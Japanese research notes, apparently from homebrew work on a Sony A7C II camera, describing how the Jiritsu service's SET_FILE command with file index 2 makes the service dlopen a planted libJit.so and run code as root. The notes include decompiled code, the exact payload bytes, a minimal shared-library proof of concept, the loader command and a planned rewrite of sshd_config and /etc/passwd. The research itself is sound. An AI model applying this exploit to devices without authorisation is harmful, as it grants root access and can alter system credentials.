# Jiritsu `SET_FILE`：ネイティブコード実行の経路

> **実機で成立（2026-11-24）。** 普通の USB ケーブル経由で、サービスプロセス内で
> **uid 0 / euid 0** として任意のネイティブコードが実行された。

## 実機での結果（2026-11-24）

`scripts/jit_load.py` で、自前ビルドの `libJit.so`（3,328 バイト、libc 非依存、
SHA-256 `40f2745f…ed46`）を番号2・モード0 で送った結果：

```text
SET_FILE returned 4 byte(s): 00000000          ← ステータス 0 ＝ 書き込み成功

/tmp/jiritsu/jit_hello.txt  35 バイト
   libJit loaded
   pid=532 uid=0 euid=0
```

- **コンストラクタが走った。** `/tmp/jiritsu/jit_hello.txt` は我々のコードが
  `openat`/`write`/`close` で作ったもので、読み戻せた。
- **権限は root。** `uid=0 euid=0`。pid 532 のプロセス内。
- `/tmp/jiritsu/jit.log` は**存在しない**（コード 6）。つまり読み込みを
  やったのは `jit_thread` の ramdisk 経路ではなく、
  **`adj_cmd_set_file` が書き込み直後に行う `dlopen`**（`0x9260`）。
  こちらは `/tmp/jiritsu/libJit.so` を**直接** `dlopen` し、
  ログは内部ログ（`jiritsu_cpp_logrec`）に出るのでファイルには残らない。
  `CreateScriptI` / `LoadScriptI` / `RunScriptI` を必要とするのは
  `jit_thread` 側だけなので、**この経路ではコンストラクタだけで足りる**
  （3シンボルを入れておくことに害はない）。

### 今カメラに残っているもの

`/tmp/jiritsu/libJit.so`（3,328 バイト、`/dev/nflasha6` 上、vfat）と
`/tmp/jiritsu/jit_hello.txt`（35 バイト）。
**どちらも不揮発**で、消すには `FILE_DELETE`（`0x4009`、書き込み系）か
別の手段が必要。ファームウェア・バックアップ・`/etc`・`/setting` は
一切触っていない。`dlopen` されたイメージは電源を切れば消える。

## 元の静的解析（2026-11-24）

USB 端末が死んでいる（[CAMERA_FACTS.md](CAMERA_FACTS.md)）一方で、
**こちらは実機で通っている輸送路の上にある**。Jiritsu のカテゴリ `0x1001` は
`0x40` AdjustControl 経由で、読み取りは 2026-11-24 に実機で成功している。

実装は `lib/libJiritsu.so`。コマンド1件が1関数で、名前がそのまま残っている
（`adj_cmd_set_file` @ `0x9038`、`adj_cmd_set_file_path` @ `0x8cf8`、
`adj_cmd_get_file2` @ `0xa1b8` ほか）。以下は IDA の Hex-Rays 出力から。

## 核心：`libJit.so` を置くと `dlopen` される

`adj_cmd_set_file` の末尾：

```c
v2 = write(v14, v17, v9);
fsync(v15); close(v15);
...
if ( strcmp(v8, "/tmp/jiritsu/libJit.so") == 0 ) {
    dlopen("/tmp/jiritsu/libJit.so", 1);   // ← サービスプロセス内で実行
    dlclose(v18);
}
```

つまり **書き込んだファイルが `libJit.so` のときだけ、サービスが自分で
`dlopen` する**。共有ライブラリの初期化（コンストラクタ／`.init_array`）は
その時点で走るので、**認証済みサービスプロセスの権限でネイティブコードが
実行される**。A7 IV の研究が「一時 `libJit.so` をサービスプロセスに
読み込ませる」と書いているのは、この同じ仕組みのこと。

## 書き込み先の確定（独立検証、2026-11-24）

`get_jiritsu_area_filename`（`0x8f1c`）を IDA でデコンパイルして、
索引→パスの対応を**コードから直接**確認した：

```c
switch (a1) {
  case 0: return "/tmp/jiritsu/tmmc.jit";
  case 1: return "/tmp/jiritsu/DIAC.csv";
  case 2: return "/tmp/jiritsu/libJit.so";     // ← 送るのはこれ
  case 3: return "/tmp/jiritsu/jit.log";       // ハンドラ側で拒否
  case 4: return "/tmp/jiritsu/history.txt";   // ハンドラ側で拒否
  default:
    for (i = 0; i != 34; ++i)                  // 34件の表（unk_47AD8、16バイト/件）
      if (*((u8 *)&unk_47AD8 + 16*i) == a1) return *((char **)&unk_47AD8 + 2*i + 1);
    return "";                                  // 空文字列 → 書き込まない
}
```

`adj_cmd_set_file`（`0x9038`）はこの戻り値に対して

1. 空文字列なら何もしない
2. `jit.log` と `history.txt` は `strcmp` で弾く
3. `libJit.so` のときだけ `/tmp/jbusy` の不在を要求（あればエラー 17）
4. `/tmp/jiritsu/*` の合計サイズを `glob` で数えて 25 MiB 制限を確認
5. 書き込み後、パスが `libJit.so` なら**その場で `dlopen`**（`0x9260`）

**つまり書き込み先は索引で一意に決まり、`/tmp/jiritsu/` の外には出ない。**
索引を間違えても、当たるのは上記5件か34件の表（いずれも `/tmp/jiritsu/` 配下、
中身は `Cam_AdjustGuide_Files/` の調整用 REQ/RES ファイル）のどれかで、
`/etc` や `/setting` やバックアップには届かない。

## 書き込み先はパスではなく「番号で選ぶ固定表」

`adj_cmd_set_file` は**リクエストのパスを使わない**。
`get_jiritsu_area_filename(request[41])` が返す名前に書く。

| 番号 | ファイル | 備考 |
| --- | --- | --- |
| 0 | `/tmp/jiritsu/tmmc.jit` | |
| 1 | `/tmp/jiritsu/DIAC.csv` | |
| **2** | **`/tmp/jiritsu/libJit.so`** | **書くと `dlopen` される** |
| 3 | `/tmp/jiritsu/jit.log` | `set_file` が明示的に拒否 |
| 4 | `/tmp/jiritsu/history.txt` | 同じく拒否 |
| その他 | `unk_47AD8` の34件の表（16バイト×34） | 未展開 |

**任意パスへは書けない。** `../../` が効くのは読み取り側
（`adj_cmd_set_file_path`、文字検証つき、最大 0x201 バイト）だけ。
つまり `/etc/ssh/sshd_config` を直接書く、という手は**使えない**。
`libJit.so` 経由でコードを走らせ、その中から書くことになる。

## リクエストの形

ペイロードの先頭3バイトがヘッダで、ハンドラ側の構造体 `a1+40/41/42` に
対応する。対応関係は `adj_cmd_get_file2` で裏が取れる：実機で成功した
プローブは `\x00\xff\x00` を送っており、ハンドラは `*(a1+40)` を最初に見て
`0` なら「`SET_FILE_PATH` で設定済みのパスを読む」分岐に入る。

```text
カテゴリ 0x1001 / コマンド 0x4007 (SET_FILE)
  payload[0]  = 0x00     ; a1+40。0 以外はエラー 513
  payload[1]  = 0x02     ; a1+41。ファイル番号（2 = libJit.so）
  payload[2]  = 0x00     ; a1+42。0 = そのまま書く / 1 = libCommuTalk を通す
  payload[3:] = ファイルの中身
```

比較：

```text
0x400f SET_FILE_PATH : payload[0]=0x00, payload[1:] = パス文字列（読み取り用）
0x4011 GET_FILE2     : payload = 00 ff 00（実機で成功）
```

## 実機での読み取り結果（2026-11-24）

`scripts/jit_load.py --list-only`（読み取りのみ）を実行した結果：

| 問い | 結果 |
| --- | --- |
| `GET_FILELIST`（`0x400a`）は通るか | 拒否はされない。ただし `00` と `00 ff 00` の両形式で **`0x10000201` ＝ コード 513（パラメータ不正）**。引数形式は未判明。空ペイロードは転送層で error 136 |
| `/tmp/jiritsu/tmmc.jit` | **存在しない**（コード 6） |
| `/tmp/jiritsu/DIAC.csv` | **存在しない** |
| `/tmp/jiritsu/libJit.so` | **存在しない** |
| `/tmp/jiritsu/jit.log` | **存在しない** |
| `/tmp/jiritsu/history.txt` | **存在しない** |

**書き込み先は空。** 上書きされる既存ファイルは無く、保全すべきものも無い。

### ステータスの読み方（確定）

ハンドラはエラーを `code | 0x10000000` で返す（`adj_cmd_set_file` の
`v11 = v6 | 0x10000000`、読み取り側も同じ）。したがって**下位16ビットがコード**。

| コード | 意味 | 根拠 |
| --- | --- | --- |
| 4 | `/dev/nflasha6` の mount 失敗 | `sys_mount` 失敗時に `v8 = 4` |
| **6** | **ファイルが存在しない** | `stat` 失敗時に `v8 = 6`。直前のログが `adj_cmd_get_file: file non-existent` |
| 8 | open 失敗 | |
| 9 | write 失敗 | |
| 15 | 25 MiB 超過 | |
| 17 | `/tmp/jbusy` が存在する | |
| 21 | dmm 確保失敗 | |
| 513 | パラメータ不正 | `GET_FILELIST` の引数違いで実際に出た |

### mount は読み取り側でも起きる

`adj_cmd_get_file2` は `(payload[1] & 0xFD) == 0` **でなければ**
`sys_mount("/dev/nflasha6", "/tmp/jiritsu")` を呼ぶ。
今回送った `00 ff 00` は `payload[1] = 0xff` なので **mount は実行されている**。
つまり「マウントされていないから見えなかった」のではなく、
**マウントした上で本当に存在しない**。

## 前提と制約

| 項目 | 内容 |
| --- | --- |
| マウント | ハンドラが毎回 `/dev/nflasha6` を `/tmp/jiritsu` に **vfat** でマウントする（`sys_mount`） |
| ロック | `libJit.so` を書くときは **`/tmp/jbusy` が存在しないこと**。`sys_file_chk_exist` は「存在する＝0」を返し、`0` ならエラー 17 で中断 |
| 容量 | `/tmp/jiritsu/*` の合計が **26,214,400 バイト（25 MiB）**未満。超えるとエラー 15 |
| サイズ | `payload` 全体から3バイト引いた値が書き込みサイズ |
| 失敗コード | 8 = open 失敗、9 = write 失敗、15 = 容量超過、17 = `/tmp/jbusy`、21 = dmm 確保失敗、513 = パラメータ不正 |

## 危険の所在

- **同じカテゴリに `0x4003 FORMAT` と `0x4006 FIRMUP` と
  `0x4009 FILE_DELETE` が並んでいる。** コマンド番号を1つ間違えると
  実験ではなく事故になる。送る前に番号を2回読むこと。
- `dlopen` された `.so` は**サービスプロセス内で走る**。無限ループや
  クラッシュはサービスを巻き込む。最初に試すものは、**何か1行ログを出すか
  小さなファイルを1つ書くだけ**にとどめ、戻り値を返して終わること。
- 書き込み先は p6（`/dev/nflasha6`）の vfat で、**撮影データや調整値の
  パーティションではない**。とはいえ `FORMAT` を誤爆すればそこを消す。


## 読み込み側の実装（独立検証、2026-11-24）

`SET_FILE` の `dlopen` は確認できた（`adj_cmd_set_file` @ `0x9038` から
`0x9260`、`adj_cmd_set_file2` @ `0x986c` から `0x9c4c`）。
加えて **専用の読み込みスレッド `IM_JIRITSU::CImJiritsu::jit_thread`**
（`0xbc74`）があり、こちらが本来の経路。IDA でデコンパイルした結果：

```c
ramdisk_mount("/tmp/jiritsu/ramdsk_libJit", "size=5M");          // 失敗 → 11
sys_file_copy(<置いたファイル>, "/tmp/jiritsu/ramdsk_libJit/libJit.so");  // 失敗 → 21
handle = dlopen("/tmp/jiritsu/ramdsk_libJit/libJit.so", 1);      // RTLD_LAZY、失敗 → 18
create = dlsym(handle, "CreateScriptI");                         // 無ければ 20
obj    = create(...);                                            // 0 を返すと "create fail" → 16
load   = dlsym(handle, "LoadScriptI");                           // 無ければ 19
run    = dlsym(handle, "RunScriptI");                            // 無ければ 20 系
...                                                              // "libJit.so crashed."
```

**重要な点が3つ。**

1. **`libJit.so` は 5 MB の ramdisk にコピーされてから `dlopen` される。**
   書き込んだ `/tmp/jiritsu/libJit.so` が直接読まれるのではない。
   ロードされる実体は RAM 上なので、**フラッシュには何も残らない**。
2. **コンストラクタだけでは足りない。** サービスは
   **`CreateScriptI` / `LoadScriptI` / `RunScriptI` の3つを `dlsym` する**。
   どれか欠けるとエラーコードを返して読み込みを中止する
   （`CreateScriptI` 無し → 20、`LoadScriptI` 無し → 19）。
   さらに `CreateScriptI()` が **0 以外を返さないと** `create fail`（16）になる。
   つまり最小の `libJit.so` は、この3シンボルをエクスポートし、
   `CreateScriptI` が非ゼロを返す必要がある。
   コンストラクタ（`__attribute__((constructor))`）は `dlopen` の時点で走るので、
   「コードを走らせる」目的ならそこで用が済むが、**3シンボルを用意しないと
   その後のログがエラーになる**（コンストラクタ自体は実行済み）。
3. `stat` の結果によっては `/tmp/jmode` を `open` する分岐がある。
   動作モードがそのファイルで切り替わる見込み（未解析）。

ログ文字列（`[JIT] ramdisk_mount B.` / `[JIT] libJit_so copy B.` /
`[JIT] libJit_so dll open B.` / `[JIT] libJit_so method load CreateScriptI B.` /
`[JIT] libJit_so method run CreateScriptI B.` / `libJit.so crashed.`）が
`/tmp/jiritsu/jit.log` に出るはずなので、**失敗しても `GET_FILE2` で
番号3（jit.log）を読めば原因が分かる**（fork の表では番号3は拒否とあるので、
その場合は `SET_FILE_PATH` + `GET_FILE2` のパス指定側で読む）。

### 最小の `libJit.so` の形

```c
/* aarch64-linux-gnu-gcc -shared -fPIC -o libJit.so jit.c */
#include <stdio.h>

__attribute__((constructor))
static void boot(void)            /* dlopen の時点で走る */
{
    FILE *f = fopen("/tmp/jiritsu/hello.txt", "w");
    if (f) { fputs("ok\n", f); fclose(f); }
}

void *CreateScriptI(void *a) { (void)a; return (void *)1; }  /* 非ゼロ必須 */
int   LoadScriptI(void *a)   { (void)a; return 0; }
int   RunScriptI(void *a)    { (void)a; return 0; }
```

ターゲットは p7 の glibc 2.25 / aarch64。`/tmp/jiritsu` 配下に書いたものは
`GET_FILE2` で読み戻せるので、**コンストラクタが走ったことを実機で確認できる**。

## 次にやること

1. 【PC】`unk_47AD8` の34件の表を展開し、残りのファイル名を確認する。
2. 【PC】最小の `libJit.so` を作る。**`CreateScriptI` / `LoadScriptI` /
   `RunScriptI` の3つをエクスポートし、`CreateScriptI` は非ゼロを返す**こと
   （上記「最小の `libJit.so` の形」）。aarch64 のクロスツールチェインが必要。
3. 【実機】`scripts/jit_load.py` を実行する。これが
   `SET_FILE`（番号2・モード0）の送信と、`/tmp/jiritsu/jit_hello.txt` と
   `/tmp/jiritsu/jit.log` の読み戻しまでを1本でやる：

   ```bash
   cd ~/git/a7c2/Sony-PMCA-RE
   sudo ./venv/bin/python ~/git/a7c2/sony-a7cii-shell-access/scripts/jit_load.py \
     ~/git/a7c2/sony-a7cii-shell-access/native/jit/libJit.so
   ```

   送る前に ELF の種別・アーキテクチャ・3シンボル・サイズを検査し、
   確認を求める。書き込み系で送るのは `SET_FILE` の1回だけで、
   読み戻しは実証済みの `SET_FILE_PATH` + `GET_FILE2`。
4. 【実機】出力の `jit_hello.txt` に `libJit loaded` と pid/uid/euid が
   出ていれば、**サービスプロセス内でコードが走った証明**になる。
   出なければ `jit.log` の段階表示（`[JIT] libJit_so dll open B.` など）で
   どこで止まったか分かる。
5. 通れば、その中から `/etc/ssh/sshd_config` と `/etc/passwd` を書き換える
   （[SSH.md](SSH.md)、[CAMERA_FACTS.md](CAMERA_FACTS.md)）。
